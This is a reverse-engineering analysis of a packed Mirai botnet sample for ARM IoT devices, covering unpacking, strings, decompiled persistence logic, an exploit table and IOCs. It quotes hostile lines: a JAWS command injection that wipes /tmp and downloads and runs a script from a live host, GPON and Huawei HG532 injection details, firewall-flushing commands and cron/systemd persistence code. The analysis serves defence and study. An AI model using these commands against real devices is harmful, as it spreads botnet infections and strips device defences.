# Reverse Engineering a Mirai Malware Variant

---

## Executive Summary

---

This malware is a **Mirai-based sample** designed to infect IoT devices like routers and cameras. It is initially **packed and obfuscated** to hide its behavior, but once unpacked, its real functionality becomes clear. 

The malware is built to **spread aggressively** by exploiting known vulnerabilities in different devices. It connects to a **command-and-control server (31.220.3.125)** and downloads additional malicious files from `z.hxhk.cc`, allowing it to work across multiple device types. 

After infection, it **takes full control of the system** by disabling firewalls, stopping services, and setting up multiple persistence methods to ensure it keeps running even after a reboot. It also scans networks to find and infect more devices.

In simple terms, this malware acts like a **self-spreading botnet agent**, turning compromised devices into part of a larger controlled network.

## Mirai Sample Metadata

---

| **Attribute** | **Value** |
| --- | --- |
| **MD5** | `7787854f14dfce9297a29bae842382e6` |
| **SHA-1** | `afc4e940484824d20b7e140debe6708aae01dc50` |
| **SHA-256** | `29b78bb68ae1a4a1463e28775c00d66b70c848964803b20a91c068ffc10a5d0c` |
| **Vhash** | `0b490d6bc29c11c918501aca2b43b24e` |
| **SSDEEP** | `1536:xk5g/E31PjsjYVyaCeDTbeP3hxwr0yzz9:250ANDWvnwr7h` |
| **TLSH** | `T1AC33020AE9E26DA28DF9623DCCADD1CF85FA15D0E5E052486128E714EED630D15FC2CE` |
| **File Type** | ELF executable (Linux) |
| **Architecture** | ARM (32-bit LSB) |
| **File Size** | 52.78 KB (54044 bytes) |
| **Packer** | UPX (3.94) [LZMA, brute] |
| **Magic** | ELF 32-bit LSB executable, ARM, version 1 (ARM), statically linked, no section header |
| **TrID** | ELF Executable and Linkable format (Linux/Generic) |

### ELF Header

| **Field** | **Value** |
| --- | --- |
| **Class** | ELF32 |
| **Data** | 2's complement, little endian |
| **Header Version** | 1 (current) |
| **OS ABI** | ARM - ABI |
| **Object File Type** | EXEC (Executable file) |
| **Required Architecture** | ARM |
| **Object File Version** | 0x1 |
| **Program Headers** | 3 |

## Hxd

---

There’s a lot of compress data.

![Screenshot 2026-05-01 at 4.26.56 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.26.56_PM.png)

![Screenshot 2026-05-01 at 4.27.17 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.27.17_PM.png)

---

There’s **`UPX`** also.

![Screenshot 2026-05-01 at 4.28.10 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.28.10_PM.png)

---

## DIE

---

![Screenshot 2026-05-01 at 4.29.40 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.29.40_PM.png)

---

### Entropy:

It’s heavily packed.

![Screenshot 2026-05-01 at 4.30.17 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.30.17_PM.png)

---

## Unpacking

---

The binary was successfully unpacked using the UPX utility. Although the packer reported minor header inconsistencies (`bad b_info`), a valid ELF executable was recovered.

- **Command Executed:** `upx -d [Sample_SHA256].elf -o out`
- **Expansion Ratio:** 31.91%
- **Original Size:** 54,044 bytes (~52 KB)
- **Unpacked Size:** 169,344 bytes (~165 KB)

![Screenshot 2026-05-01 at 4.32.46 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.32.46_PM.png)

### Post-Unpacking Observations

Following the decompression, the binary size increased by approximately **3.1x**. Preliminary inspection of the unpacked file (`out`) confirms the presence of the following indicators:

- **Architecture:** Confirmed ARM 32-bit (Statically Linked).
- **Strings:** Decipherable system calls and network-related strings (previously compressed) are now accessible for further static analysis.

---

## Unpacked Sample Analysis

---

### DIE

![Screenshot 2026-05-01 at 4.37.26 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.37.26_PM.png)

Now the entropy is we see is not packed.

![Screenshot 2026-05-01 at 4.38.34 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.38.34_PM.png)

---

### Hxd

Now we’ll see that those compressed high entropy data is now decompressed.

![Screenshot 2026-05-01 at 4.40.24 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.40.24_PM.png)

We can see **`bash`** commands, wget commands stuff like this.

![Screenshot 2026-05-01 at 4.43.05 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.43.05_PM.png)

---

## Unpacked String Analysis

---

- Command: strings out > strings.txt

After successful decompression of the UPX layer, a static analysis of the recovered strings was performed. The results reveal a highly aggressive Mirai variant targeting diverse IoT architectures.

### Remote Code Execution (RCE) Payloads

![Screenshot 2026-05-01 at 4.52.41 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.52.41_PM.png)

| **Target / Vulnerability** | **Payload Signature** |
| --- | --- |
| **Realtek / UPnP** | `SOAPAction: urn:schemas-upnp-org:service:WANIPConnection:1#AddPortMapping` |
| **Huawei Home Gateway** | `SOAPAction: urn:dslforum-org:service:Time:1#SetNTPServers` |
| **ThinkPHP RCE** | `index.php?s=/index/\think\app/invokefunction&function=call_user_func_array` |
| **GPON Routers** | `POST /GponForm/diag_Form?images/ ... dest_host=\`busybox+wget...`` |

---

### Network Infrastructure & C2

The following network indicators were identified within the binary:

- **Malware Distribution Hub:** `z.hxhk.cc` (Used to pull secondary payloads like `sys64.mips` and `sys64.arm7`).
- **Command & Control (C2) IP:** `31.220.3.125`
- **Bot Identity (User-Agent):** `r00ts3c-owned-you`

![Screenshot 2026-05-01 at 4.53.20 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.53.20_PM.png)

![Screenshot 2026-05-01 at 4.59.53 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_4.59.53_PM.png)

![Screenshot 2026-05-01 at 5.00.21 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.00.21_PM.png)

---

### Persistence & System Sabotage ([dars.sh](http://dars.sh))

The binary contains an embedded shell script (`/etc/dars.sh`) designed to neutralize the host device's security and ensure persistence. Key actions include:

- **Firewall Disabling:** Execution of `iptables -F` and `ufw disable` to allow unrestricted traffic.
- **Service Termination:** Mass removal of system services (e.g., `apache2`, `ssh`, `cron`, `bluetooth`) to prioritize botnet resources.
- **Persistence:** Modification of `/etc/crontab` to execute a hidden module (`.mod`) every minute.

### Obfuscated Configuration Table

A block of XOR-obfuscated uppercase strings was identified (e.g., `TKXZT`, `RCQQUMPF`). These likely contain the bot's internal configuration, including default login credentials and internal command aliases, which are decrypted at runtime using a single-byte XOR key (common in Mirai forks).

### Exploitation and Lateral Movement

The unpacked binary contains hardcoded exploit strings designed to weaponized known vulnerabilities in IoT firmware. These strings demonstrate a "worm-like" capability to spread across a network by injecting commands into vulnerable web interfaces.

### Targeted Exploit: Huawei Home Gateway (CVE-2017-17215)

The malware targets the TR-064 UPnP service on Huawei HG532 routers. It uses a specific SOAP request to trigger a Remote Code Execution (RCE) vulnerability.

- **Target URI:** `/ctrlt/DeviceUpgrade_1`
- **Authentication Bypass:** The sample utilizes a hardcoded Digest Authorization header:
    
    > `username="dslf-config"`, `realm="HuaweiHomeGateway"`
    > 
- **Command Injection Vector:** The exploit injects a shell command into the `<NewStatusURL>` field using the `$()` syntax.
- **Decoded Payload:**
    1. Uses `busybox wget` to download `sys64.mips` from `z.hxhk.cc`.
    2. Applies `chmod 777` to make the binary executable.
    3. Executes the new stage with the argument `huw.s`.

### Targeted Exploit: JAWS Web Server

The sample also attempts to infect DVRs and IP cameras running the JAWS web server.

- **Request Method:** `GET /shell?cd+/tmp;rm+-rf+*;wget+z.hxhk.cc/jaws;sh+/tmp/jaws+js`
- **Mechanism:** Direct command injection via the URL query string.
- **Action:** It clears the `/tmp` directory and pulls a secondary script (`jaws`) which likely identifies the device's architecture (MIPS, ARM, or x86) before installing the final bot.

![Screenshot 2026-05-01 at 5.03.58 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.03.58_PM.png)

---

## IDA Analysis

---

### (`main` @ `0x1ADD4`)

```jsx
main()
  ├─ flush_iptables_and_disable_firewall()  [0x1AD20]
  │    └─ iptables -F/-X all chains, stop firewalld, ufw disable
  ├─ signal(SIGCHLD, SIG_IGN)
  ├─ signal(SIGTRAP, signal_handler_reinit_cnc)
  ├─ table_init_decode_strings()            [0x21E90]  ← XOR-0x22 decode
  ├─ resolve_cnc_address()                  [0x1A908]  ← DNS + fallback
  ├─ scanner_main_telnet_worker()           [0x16654]  ← 424 BB scanner
  ├─ table_unlock_decode_constants()        [0xCC70]   ← 2nd decode pass
  ├─ setup_raw_cnc_socket()                 [0x1A9A8]  ← raw socket/ioctl
  └─ register_all_exploit_modules()         [0x1AA94]
       └─ write_dropper_scripts_and_persist() [0x1AAF8]
```

![Screenshot 2026-05-01 at 5.44.30 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.44.30_PM.png)

### Direct System Call Analysis

The use of `SVC` instructions is a classic anti-analysis and portability technique. By bypassing `libc`, the malware becomes harder to trace using standard user-land hooks.

The malware uses the ARM EABI syscall convention, where the syscall number is encoded within the `SVC` instruction or loaded into `R7`.

| **Memory Address** | **Instruction** | **System Call (ARM EABI)** | **Functionality** |
| --- | --- | --- | --- |
| `0x0002853C` | `SVC 0x900001` | **sys_exit** | Terminates the current process/thread. |
| `0x00028560` | `SVC 0x900108` | **sys_getpgrp** | Gets the process group ID. |

### Logic Flow: Error Handling & Persistence

The subroutines `sub_28534` and `sub_2855C` implement a robust error-checking mechanism common in malicious binaries:

- **Error Detection:** The instruction `CMN R0, #0x1000` checks if the kernel returned a value in the range of `1` to `4095`.
- **Errno Capture:** If a syscall fails, the malware uses `RSB R3, R4, #0` to calculate the positive integer of the error code and stores it via `sub_24288` for internal logging.
- **Infinite Termination Loop:** In `sub_28534`, the code contains a backward branch (`B loc_28538`) after the exit call. This ensures that even if the `sys_exit` call were to fail or return, the malware would immediately re-attempt the termination, preventing any further code execution.

### Technical Significance

By utilizing direct `SVC` instructions, the botnet achieves two goals:

1. **Evasion:** It bypasses user-land monitoring tools that hook standard library functions.
2. **Environment Independence:** It remains functional on "lean" IoT systems where standard libraries like `uClibc` or `glibc` might be stripped or non-standard.

![Screenshot 2026-05-01 at 5.25.26 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.25.26_PM.png)

### Security Infrastructure Sabotage

The function `sub_1AD20` is a dedicated routine designed to completely disable the host's network defenses. It executes a sequence of system commands via a wrapper function (`sub_27728`), which likely invokes `system()` or `execve()`.

### Firewall Deactivation Table

The malware systematically flushes all rules and deletes all custom chains within the Linux `iptables` framework, effectively leaving the system wide open.

---

| **Target** | **Command Executed** | **Purpose** |
| --- | --- | --- |
| **Filter Table** | `iptables -F` / `iptables -X` | Flush all rules and delete user-defined chains. |
| **NAT Table** | `iptables -t nat -F` / `-X` | Disable Network Address Translation rules. |
| **Mangle Table** | `iptables -t mangle -F` / `-X` | Remove specialized packet alteration rules. |
| **Default Policy** | `iptables -P INPUT ACCEPT` | Change default policy to allow all incoming traffic. |
| **Default Policy** | `iptables -P FORWARD ACCEPT` | Ensure the device can act as a bridge/relay for traffic. |

All the bash commands.

![Screenshot 2026-05-01 at 5.32.05 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.32.05_PM.png)

### Service-Level Neutralization

Beyond modifying rules, the malware attempts to shut down the firewall services entirely to prevent them from restarting or being reconfigured.

- **Firewalld:** Executes `systemctl stop firewalld` and `systemctl disable firewalld`. This targets Red Hat-based distributions (CentOS, Fedora).
- **UFW (Uncomplicated Firewall):** Executes `ufw disable`, `systemctl disable ufw`, and `systemctl stop ufw`. This targets Debian-based distributions (Ubuntu, Raspberry Pi OS).
- **Persistence of Sabotage:** It executes `service iptables save` after flushing the rules, ensuring that even if the device reboots, the empty (defenseless) configuration persists.

### Technical Impact

- **Unrestricted Access:** By setting the default policy to `ACCEPT` and flushing all rules, the malware ensures that its Command & Control (C2) traffic and DDoS attack packets are never blocked by the host.
- **Anti-Forensics/Stealth:** All output is redirected to `/dev/null 2>&1`, meaning the device owner will see no error messages or command output in the standard terminal if they are logged in.
- **Worm Readiness:** Disabling the `FORWARD` chain restrictions is a key indicator that the bot intends to use the host as a pivot point to scan and infect other devices on the internal LAN.

---

### Process Stabilization & Shell Execution

The code sequence leading up to `sub_27AA0` reveals how the malware prepares the environment for its background operations and ensures it remains active on the host.

### File Descriptor Redirection (Standard I/O)

The repeated calls to `sub_269BC` (likely a wrapper for `dup2`) suggest the malware is redirecting its standard streams. This is a common step in **daemonization**.

- **R0 = #3, #2, #0x11:** These represent the file descriptors being manipulated.
- **Purpose:** By redirecting `stdin`, `stdout`, and `stderr`, the malware prevents any diagnostic messages from appearing on the user's console, further hiding its activity during background execution.

### Execution of Persistent Payloads

The malware utilizes a wrapper function (`sub_27AA0`, likely a variant of `execl` or `system`) to execute a new shell process.

| **Register** | **Value / Pointer** | **Description** |
| --- | --- | --- |
| **R0** | `"/bin/sh"` | The shell binary to be executed. |
| **R1** | `"sh"` | The process name (argv[0]). |
| **R2** | `"-c"` | Flag indicating the shell should execute the following string. |
| **SP + Var_18** | `R4` (Payload) | The specific command string stored in R4 (referenced earlier as `systam.sh` or similar). |

---

![Screenshot 2026-05-01 at 5.35.37 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.35.37_PM.png)

### Post-Execution Termination

Immediately following the shell execution, the malware calls `sub_28534` with `R0 = #0x7F` (127).

- **The Exit Code:** 127 is the standard Linux exit code for "command not found" or a failed shell execution.
- **Functionality:** This acts as a cleanup routine. If the shell execution at `sub_27AA0` fails to replace the process image (or if it returns), the malware triggers an immediate, forced exit to prevent the bot from hanging in an unstable state.

---

![Screenshot 2026-05-01 at 5.41.09 PM.png](Reverse%20Engineering%20a%20Mirai%20Malware%20Variant/Screenshot_2026-05-01_at_5.41.09_PM.png)

Pseudo Code.

```jsx
// Dropper/persistence writer: creates .daemonx86 watchdog script, copies self to .configs, sets up systemd service, cron job, rc.local
int __fastcall write_dropper_scripts_and_persist(int a1)
{
  int result; // r0
  BOOL v2; // r6
  int v3; // r0
  int v4; // r8
  int v5; // r4
  int v6; // r0
  int v7; // r4
  int v8; // r4
  int v9; // r4
  int v10; // r0
  _BYTE v11[2048]; // [sp+0h] [bp-C80h] BYREF
  char v12[1024]; // [sp+800h] [bp-480h] BYREF
  _BYTE v13[128]; // [sp+C00h] [bp-80h] BYREF

  result = sub_23D10(a1);
  v2 = result > 0 || result == -1;
  dword_39580 = result;
  if ( !v2 )
  {
    v3 = sub_26310(dword_3B71C);
    v4 = sub_26AE0(v3 + 145);
    sub_244FC(
      v4,
      "#!/bin/bash\n"
      "while true; do\n"
      "    if ! pgrep -x '.configs' > /dev/null; then\n"
      "        pkill sys64. \n"
      "        ./.configs %s &\n"
      "    fi\n"
      "    sleep 1\n"
      "done\n",
      (const char *)dword_3B71C);
    v5 = sub_24448(".daemonx86", "w");
    v6 = sub_26310(v4);
    sub_25D18(v4, 1, v6, v5);
    sub_242C8(v5);
    system_cmd_exec("chmod +x .daemonx86");
    v7 = sub_23EA8("/proc/self/exe", v12, 1023);
    if ( v7 == -1 )
      sub_24454("readlink");
    v12[v7] = 0;
    while ( 1 )
    {
      if ( !sub_24448(".configs", "r") )
      {
        sub_244CC(v11, 2048, "cp '%s' '.configs'", v12);
        system_cmd_exec(v11);
        system_cmd_exec("chmod 777 .configs");
      }
      if ( sub_2646C(v12, ".configs") && !sub_24448(".daemonx86", "r") )
      {
        v9 = sub_24448(".daemonx86", "w");
        v10 = sub_26310(v4);
        sub_25D18(v4, 1, v10, v9);
        sub_242C8(v9);
        system_cmd_exec("chmod +x .daemonx86");
      }
      v8 = sub_246E0("pgrep -x .daemonx86", "r");
      if ( sub_25C84(v13, 128, v8) )
      {
        sub_245E0(v8);
      }
      else
      {
        sub_245E0(v8);
        sub_244CC(v11, 2048, "./.daemonx86 &");
        system_cmd_exec(v11);
        sub_27B34(1);
      }
      sub_27B34(1);
      sub_27B34(2);
    }
  }
  return result;
}
```

### Persistence (`write_dropper_scripts_and_persist` @ `0x1AAF8`)

Four overlapping persistence mechanisms:

**a) Dropper files**

- Copies self to `.configs` (working dir) and `/usr/bin/.configs`
- Creates watchdog `.daemonx86` — bash loop that respawns `.configs` if it dies, kills competing `sys64.*` processes
- Plants `/usr/bin/.sshad` as a secondary hidden daemon (disguised as SSH)

**b) rc.local** — appends `echo '%s &' >> /etc/rc.local`

**c) systemd service** — writes `/etc/systemd/system/<name>.service`, runs `systemctl daemon-reload && systemctl enable`

**d) cron job** — writes `/etc/cron.d/systam` → `* * * * * root /etc/systam.sh &`

---

### IoT Exploit Arsenal (`register_all_exploit_modules` chain)

All exploits download payloads from **`z.hxhk.cc`**:

| Function | Exploit | CVE | Payload |
| --- | --- | --- | --- |
| `exploit_upnp_wanipconnection_adb` (0x82C0) | UPnP WANIPConnection SOAP RCE | — | `z.hxhk.cc/adb` (via `/tmp/.e`) |
| `exploit_linksys_tmunblock_cgi` (0x8E7C) | Linksys tmUnblock.cgi RCE | — | `z.hxhk.cc/sys64.mpsl` (`asus.s`) |
| `exploit_comtrend_ping_cgi_rce` (0x9A60) | Comtrend ping.cgi injection | CVE-2017-6884 | `z.hxhk.cc/comtrend` |
| `exploit_gpon_diag_form_port80` (0x11E6C) | GPON router RCE | CVE-2018-10561 | `z.hxhk.cc/gpon443` (`80`) |
| `exploit_gpon_diag_form_port443` (0x12B60) | GPON router RCE | CVE-2018-10562 | `z.hxhk.cc/gpon443` (`g443`) |
| `exploit_huawei_hg532_tr064_cve2017_17215` (0x14370) | Huawei HG532 TR-064 SOAP | CVE-2017-17215 | `z.hxhk.cc/sys64.mips` (`huw.s`) |
| `exploit_http_dispatcher` (0xA6F8) | D-Link HNAP1 / UPnP picsdesc.xml | — | `z.hxhk.cc/sys64.mips` (`hn.s`/`rk.s`) |
| (0x2E634) | **ThinkPHP RCE** | CVE-2018-20062 | `z.hxhk.cc/sys64.x86` (`tp.s`) |
| (0x2E76C) | TR-069 CWMP SetNTPServers port 7547 | — | `z.hxhk.cc/sys64.mips` (`tr.s`) |
| (0x2C500) | JAWS DVR `/shell` RCE | — | `z.hxhk.cc/jaws` (`js`) |
| (0x2F430) | D-Link ViewLog.asp RCE | — | `z.hxhk.cc/sys64.arm7` (`zy.s`) |

Multi-architecture payloads: `.mips`, `.mpsl`, `.arm7`, `.x86`, `.adb` — targeting the full IoT spectrum.

---

## IOCs

| Type | Value |
| --- | --- |
| C2 IP | `31.220.3.125:80` |
| Payload CDN | `z.hxhk.cc` |
| Bot binaries dropped | `.configs`, `.daemonx86`, `/usr/bin/.sshad`, `/usr/bin/.configs` |
| Persistence scripts | `/etc/dars.sh`, `/etc/systam.sh`, `/etc/cron.d/systam` |
| Mutex string | `meinsm` (XOR-0x22 → `OGKLQO`) |
| User-Agent | `r00ts3c-owned-you`, `Hello, World`, `Hello-World` |

---

---